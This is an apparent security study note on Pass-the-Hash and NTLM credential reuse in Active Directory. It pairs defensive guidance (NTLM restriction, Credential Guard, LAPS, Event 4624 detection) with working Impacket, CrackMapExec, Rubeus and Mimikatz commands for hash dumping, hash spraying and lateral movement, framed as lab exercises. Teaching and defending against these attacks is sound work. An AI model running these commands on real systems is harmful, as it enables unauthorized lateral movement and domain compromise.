---
migration_source: published-html-snapshot
migration_status: needs-editorial-review
---

# Pass-the-Hash and NTLM Credential Reuse

## Definition

Pass-the-Hash (PtH) is the technique of authenticating to an NTLM-speaking service using **the NT hash of a user's password directly**, without ever knowing or cracking the plaintext password. The technique exists because NTLM uses the NT hash itself as the long-term authentication secret — the hash is functionally equivalent to the password. PtH is the canonical follow-up to credential extraction ([[dcsync-and-ntdsdit-extraction|DCSync]], LSASS dumping, [[kerberoasting|Kerberoasting]] when the recovered account uses NTLM): you do not need to crack what you have already extracted.

## Why it matters

PtH is what converts "I dumped 50,000 NTLM hashes from a DC" into "I logged in as every user in the domain". It is the most direct *use* of credentials extracted by every other AD attack in this branch. Without understanding PtH, the chain from initial foothold → DCSync stops at "I have a file full of hashes" and the operator misses the entire post-exploitation phase.

The technique also matters as a teaching note because it surfaces three transferable senior facts about Windows authentication:

- **The NT hash *is* the password.** There is no extra derivation step at authentication time — NTLM hashes the password once with MD4, and the resulting 16-byte value is what gets used for every subsequent authentication. Recovering the hash from any source is equivalent to learning the password.
- **NTLM is still ubiquitous.** Even in "Kerberos-first" environments, NTLM fallback occurs on SMB to IP addresses (no SPN), legacy applications, cross-trust scenarios, local accounts on member servers, and any service that explicitly negotiates NTLM. The "we use Kerberos" claim is almost always partial.
- **Disabling NTLM is a multi-year project.** Microsoft has been deprecating NTLM since Windows 2000. As of 2026, complete disablement is feasible in greenfield environments and aspirational in established ones. The senior framing is that NTLM mitigation is a *gradient* (Credential Guard → restricted NTLM → audit-only → blocked), not a switch.

## How it works

PtH reduces to **3 steps**:

1. **Obtain the NT hash.** Sources: [[dcsync-and-ntdsdit-extraction|DCSync]] for any domain user, LSASS memory dump on any host where the user has logged in, SAM database extraction on a local machine, [[kerberoasting|Kerberoasting]] / [[as-rep-roasting|AS-REP Roasting]] *if* the recovered password is cracked back to derive the hash (rare — operators usually use the recovered password directly).
2. **Replace the password with the hash in the authentication exchange.** Every NTLM-speaking client supports this; the relevant tools (Impacket's `psexec.py`, `smbexec.py`, `wmiexec.py`, `secretsdump.py`; CrackMapExec; Evil-WinRM; SQL Server's `sqlcmd` via Impacket) all accept `-hashes <LM>:<NT>` syntax in place of `-password`.
3. **Authenticate to a service that trusts the user's identity.** SMB (file shares, admin shares), WinRM (PowerShell remoting), MSSQL (when SQL Authentication is disabled), MS-RPC (DCOM, SCM for service control), HTTP (IIS with NTLM auth), and many internal applications. The service has no way to distinguish PtH from a normal login — the NTLM exchange is byte-identical.

A representative end-to-end sequence:

```
# After DCSync extracted the hash for the local Administrator account:
impacket-psexec -hashes :ABC123...DEF456 LAB.LOCAL/Administrator@10.0.0.5
# Lands as NT AUTHORITY\SYSTEM on 10.0.0.5 without ever knowing a plaintext password.

# Lateral move via WMI, same syntax:
impacket-wmiexec -hashes :ABC123...DEF456 LAB.LOCAL/Administrator@10.0.0.10

# CrackMapExec for spray-style validation across many hosts:
crackmapexec smb 10.0.0.0/24 -u Administrator -H ABC123...DEF456 --local-auth
```

The bug is not "NTLM is broken cryptographically" (MD4 is broken but not in a way that matters for PtH); it is *the hash is the credential — extracting it once allows perpetual reuse for the lifetime of the password*.

## Techniques / patterns

- **`-hashes :<NT>` is the canonical Impacket syntax.** The LM half is almost always empty in modern AD (LM hashes have been disabled by default since Windows Vista); pass an empty string before the colon.
- **Local vs domain authentication is the first decision.** `--local-auth` (CrackMapExec) and the absence of a domain prefix (Impacket) authenticate against the local SAM database; with a domain prefix you authenticate against AD. Local-admin password reuse across a fleet is the classic chain (one compromised local admin = every host with the same password).
- **CrackMapExec is the breadth tool.** `crackmapexec smb 10.0.0.0/24 -u Administrator -H <hash>` validates the hash against every host in a range in seconds. Tells you exactly which hosts the credential works on.
- **Evil-WinRM is the depth tool.** Once you have a working hash for a host with WinRM enabled, `evil-winrm -i HOST -u user -H <hash>` gives a full PowerShell session for hands-on operation.
- **PtH chains with Over-Pass-the-Hash to escalate to Kerberos.** With the NT hash, you can request a Kerberos TGT (Rubeus `asktgt /user:X /rc4:<NT>`). The TGT then drives Kerberos-only services that reject NTLM. Over-PtH is the bridge from NTLM to Kerberos with the same credential material.
- **AES keys are the modern equivalent.** Newer Windows versions cache AES128/AES256 Kerberos keys instead of (or alongside) the NT hash. Pass-the-Key with AES keys is the equivalent technique. Tools handle this transparently via `-aesKey` flag.
- **OPSEC: NTLM auth on a server is noisy.** Every successful PtH generates Event 4624 with LogonType=3 (network) and AuthenticationPackage=NTLM. Mature defenders alert on NTLM auth where it should not happen. See [[detect-kerberoasting-and-as-rep-roasting|Detect Kerberoasting and AS-REP Roasting]] for the broader detection framing and Detection and defense below.

## Variants and bypasses

PtH-family techniques cluster into **5 variants** by credential material.

### 1. Classic Pass-the-Hash (NTLM)

Use the NT hash for NTLM authentication directly. The original technique, still ubiquitous. Works against SMB, WinRM, MSSQL, MS-RPC, IIS, and any service that accepts NTLM.

### 2. Over-Pass-the-Hash (NTLM → Kerberos)

Use the NT hash (or AES key) to request a Kerberos TGT, then use the TGT for Kerberos-only services. The bridge from NTLM credential material to Kerberos auth. Required when target services reject NTLM (modern hardening) but still trust Kerberos.

### 3. Pass-the-Ticket

Skip the credential-reuse step entirely — use a Kerberos ticket (TGT or service ticket) directly, exported from a compromised host's memory via Mimikatz/Rubeus. No password or hash required; the ticket itself is the bearer credential for its lifetime. The "TGT theft → impersonation" attack pattern.

### 4. Pass-the-Key (Kerberos AES keys)

Same as Over-PtH but using cached AES128/AES256 keys instead of the NT hash. Modern Windows caches AES keys; on hosts where the NT hash is not in LSASS but AES keys are, this is the only path forward.

### 5. Local-admin password reuse across a fleet

The simplest variant operationally — extract local Administrator hash from one workstation, spray it against the rest with `crackmapexec --local-auth`. If the organization deploys workstations from a common image with the same local admin password, the entire fleet falls in minutes. LAPS (Local Administrator Password Solution) is the structural defense.

## Impact

Ordered by typical real-world severity:

- **Lateral movement to every host the user can reach.** PtH against domain admin yields admin access to every domain-joined host. PtH against a service account yields whatever the service account can reach. PtH against a workstation user yields that user's session everywhere.
- **Silver-Ticket persistence from a service account hash.** Recovered service-account hash → forge service-scoped Kerberos TGS tickets → persistent service-specific access that does not require further contact with the KDC. See [[silver-ticket-and-service-account-persistence]].
- **Cross-domain pivot in trust scenarios.** PtH a domain admin's hash in one domain, use Over-PtH to request a TGT for a trusted domain, pivot into the trusted domain.
- **MSSQL impersonation chain.** PtH a service account that owns a SQL Server linked-server chain → execute as the linked-server identity on the next hop → enumerate further. Classic chained-PtH escalation.
- **Forensic ground-truth loss.** Every PtH event looks like a legitimate logon from the user's perspective. Without behavioral analytics, attribution after compromise is hard.

## Detection and defense

Ordered by effectiveness:

1.
**Disable NTLM on hosts that can tolerate it (Kerberos-only).**
   The structural fix. Modern AD hosts that only communicate with current Windows clients can usually run with NTLM disabled (`Network security: Restrict NTLM` GPO). Audit-mode first to find dependencies, then enforce. Removes the entire PtH attack surface for those hosts.

2.
**Microsoft Credential Guard on every endpoint.**
   Credential Guard isolates LSASS in a Virtual Secure Mode (VSM) container, making in-memory hash extraction (`mimikatz sekurlsa::logonpasswords`) fail. Does not stop PtH against hashes obtained via DCSync, but stops the LSASS-extraction precondition on every endpoint that has it.

3.
**Behavioral detection on Event 4624 LogonType=3 with AuthenticationPackage=NTLM.**
   Every PtH event is a successful network logon authenticated via NTLM. Detection rules: (a) NTLM auth to hosts that should only use Kerberos; (b) NTLM auth from unexpected source/destination pairs (workstation A authenticating to workstation B); (c) NTLM auth using local admin from a host that should not have that account in use. See [[behavioral-detection-vs-signature-detection|Behavioral vs Signature Detection]].

4.
**Protected Users security group for sensitive accounts.**
   Adding a user to the Protected Users group disables NTLM, LM, DES, and RC4 for that user; forces Kerberos with AES; prevents long-term cached credentials from being stored on member hosts. The single most impactful per-account hardening for Tier 0 / Tier 1 admins. See [[tier-zero-administration-and-paw]].

5.
**LAPS (Local Administrator Password Solution) to break local-admin password reuse.**
   LAPS rotates the local Administrator password per-host to a unique randomized value stored in AD. Eliminates the "one local admin hash → entire fleet" variant. Microsoft Windows LAPS (built into Windows 11 / Server 2022+) replaces the legacy MS LAPS Office tool.

6.
**NTLMv1 must be blocked outright.**
   NTLMv1 is cryptographically broken — it leaks the NT hash via the network challenge/response. Block NTLMv1 in domain policy (`LmCompatibilityLevel = 5`); any NTLMv1 attempt is an alert-worthy indicator of legacy systems or downgrade attacks.

### What does not work as a primary defense

- **Changing passwords frequently** without addressing the hash extraction primitive. The hash is the credential; rotating passwords *does* invalidate previously-extracted hashes, but only on the cadence of the rotation. Until rotation, the hash works. *Forced rotation after suspected compromise is essential* — but routine 90-day rotation does not meaningfully reduce PtH risk between rotations.
- **Strong password policies** as a PtH defense. The attacker has the hash, not the password — password complexity is irrelevant to PtH.
- **Account lockout policies.** PtH uses valid credentials and does not trigger lockout. The lockout policy is a brute-force defense, not a PtH defense.
- **Network segmentation alone.** Useful for limiting blast radius, but does not prevent PtH within a segment. Necessary but not sufficient.
- **Trusting that "we use Kerberos".** Audit actual auth packages on real network captures. NTLM fallback is more common than most operators believe.

## Practical labs

Run only against owned lab environments or authorized engagements.

```
# Lab 1 — Recover a hash from an authorized lab DC via DCSync (precondition).
impacket-secretsdump LAB.LOCAL/Administrator:'AdminPass!'@10.0.0.1 \
    -just-dc-user testuser
# Output line for the hash to use:
#   testuser:1234:aad3b435b51404eeaad3b435b51404ee:ABC...XYZ:::
```

```
# Lab 2 — Pass-the-Hash via SMB to lateral target.
impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:ABCXYZ \
    LAB.LOCAL/testuser@10.0.0.10
# Should land as testuser on 10.0.0.10 without supplying a password.
```

```
# Lab 3 — Hash spray across a subnet (validation breadth).
crackmapexec smb 10.0.0.0/24 \
    -u Administrator -H ABCXYZ --local-auth
# Output: green Pwn3d! lines for every host where the local admin hash works.
# This is the local-admin-reuse failure mode in action.
```

```
# Lab 4 — Over-Pass-the-Hash to obtain a Kerberos TGT.
# On Windows operator host with Rubeus:
Rubeus.exe asktgt /user:testuser /rc4:ABCXYZ /domain:LAB.LOCAL /nowrap
# Then use the resulting base64 TGT with /ptt to inject and access Kerberos-only services.
```

```
# Lab 5 — Defender-side detection: NTLM auth event audit.
# On a lab DC, after running the labs above:
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4624} -MaxEvents 200 |
    Where-Object {
        $_.Properties[8].Value -eq 3 -and                         # LogonType 3 (Network)
        $_.Properties[10].Value -eq 'NTLM'                        # AuthenticationPackage
    } |
    Select-Object TimeCreated,
        @{n='User';e={$_.Properties[5].Value}},
        @{n='SourceIP';e={$_.Properties[18].Value}},
        @{n='Target';e={$_.Properties[6].Value}}
# Every line is a PtH-candidate event. Build alerting on anomalous (User, SourceIP) pairs.
```

```
# Lab 6 — Verify Credential Guard blocks LSASS dumping.
# On a Credential Guard-enabled lab endpoint:
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
# Expected: NTLM hashes shown as `n.s. (NULL)` or empty — VSM-isolated LSASS prevents extraction.
# Without Credential Guard: hashes are shown in clear hex.
```

## Practical examples

- **DCSync → fleet compromise in minutes.** Operator DCSyncs `Domain Admin` and an OU full of service accounts. `crackmapexec smb 10.0.0.0/16 -u svc_replication -H <hash> --local-auth` lands on 2,400 hosts in three minutes. The lateral phase is hash-spray; the cracking phase is unnecessary.
- **Service account chained PtH to SQL impersonation.** Kerberoasting yields `svc_appdb` password. Operator uses the password (or its derived NT hash) to authenticate to the SQL Server hosting the linked-server chain → `xp_cmdshell` as the SQL service account → lateral to the host running another linked-server target. Three-hop PtH-equivalent chain ending at sensitive data.
- **Local-admin reuse against an imaged fleet.** Pentester recovers local Administrator hash from one workstation. The organization deployed workstations from a 2019 golden image with the same local admin password. CrackMapExec confirms: 800 of 850 workstations accept the hash. LAPS would have eliminated this in one configuration change.
- **Credential Guard saves the day.** Same fleet, 18 months later, after Credential Guard rollout. Operator compromises one workstation but cannot extract any LSASS hashes. Lateral movement requires going back to AD (DCSync from a privileged account) — much louder, much more detectable.
- **NTLMv1 downgrade catch.** SIEM rule alerts on NTLMv1 authentication. Investigation reveals a 2008-era multifunction printer using NTLMv1 against AD daily. Printer is decommissioned, downgrade alert closed, the historic NTLMv1 traffic is investigated for evidence of credential interception during its lifetime.

## Related notes

- [[kerberoasting]] — PtH is one of the primary ways to use a Kerberoasted credential when the target service speaks NTLM rather than Kerberos.
- [[as-rep-roasting]] — same: recovered credential frequently lands in PtH workflows.
- [[bloodhound-attack-path-analysis]] — BloodHound's `AdminTo` and `CanRDP` edges describe exactly which hosts a PtH credential reaches.
- [[dcsync-and-ntdsdit-extraction]] — DCSync produces the bulk NTLM hash output that PtH consumes; this note is "what you do with DCSync output".
- [[silver-ticket-and-service-account-persistence]] — Silver Tickets and PtH use the same recovered service-account hash; the choice is "persist via Silver Ticket" vs "actively reuse via PtH".
- [[gmsa-and-modern-service-account-hardening]] — gMSA accounts mitigate service-account PtH by rotating their passwords automatically.
- [[tier-zero-administration-and-paw]] — the structural defense against PtH ending at Tier 0.
- [[password-hashing|Password hashing]] — NTLM's NT hash is MD4 of the password, unsalted; the entire PtH threat model is downstream of that single design choice.
- [[cia-triad-and-what-it-actually-decides|CIA triad]] — PtH is an authenticity/integrity breach (impersonation), not a confidentiality breach (the attacker already has the credential).
- [[behavioral-detection-vs-signature-detection|Behavioral vs Signature Detection]] — detection is purely behavioral; no signature distinguishes PtH from legitimate NTLM auth.

### Suggested future atomic notes

- over-pass-the-hash-deep-dive — protocol-level detail on Rubeus `asktgt`, AES-key vs NT-hash workflows.
- ntlm-relay-attacks — adjacent attack family: capture an NTLM handshake and relay it to a different service instead of recovering the hash.
- credential-guard-and-vsm-internals — how Credential Guard isolates LSASS in Virtual Secure Mode.
- laps-and-local-admin-password-rotation — operational deployment of Windows LAPS / legacy MS LAPS.
- detect-pass-the-hash-and-ntlm-anomalies — defender-side playbook pair for this note.

## References

- **Foundational:** MITRE ATT&CK T1550.002 — Use Alternate Authentication Material: Pass the Hash — https://attack.mitre.org/techniques/T1550/002/
- **Research / Deep Dive:** Microsoft — Mitigating Pass-the-Hash and Other Credential Theft (v2) — https://www.microsoft.com/en-us/download/details.aspx?id=54095
- **Hardening:** Microsoft Learn — Credential Guard overview — https://learn.microsoft.com/en-us/windows/security/identity-protection/credential-guard/
